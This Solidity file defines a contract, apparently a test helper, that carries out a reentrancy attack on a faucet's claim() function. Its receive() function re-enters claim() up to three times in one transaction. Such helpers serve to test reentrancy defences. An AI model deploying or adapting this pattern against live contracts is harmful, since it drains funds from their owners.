// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEthTestFaucet {
    function claim() external;
}

/**
 * @title MaliciousClaimAttacker
 * @dev A malicious contract that attempts to perform a reentrancy attack on the claim() function
 */
contract MaliciousClaimAttacker {
    IEthTestFaucet public faucet;
    uint256 public attackCount;
    uint256 public maxAttacks;
    
    constructor(address _faucet) {
        faucet = IEthTestFaucet(_faucet);
        maxAttacks = 3; // Try to claim 3 times in one transaction
    }
    
    /**
     * @dev Initiates the attack by calling claim on the faucet
     */
    function attack() external {
        attackCount = 0;
        faucet.claim();
    }
    
    /**
     * @dev Receive function that attempts to re-enter the claim function
     */
    receive() external payable {
        attackCount++;
        if (attackCount < maxAttacks) {
            // Attempt to re-enter claim()
            faucet.claim();
        }
    }
}
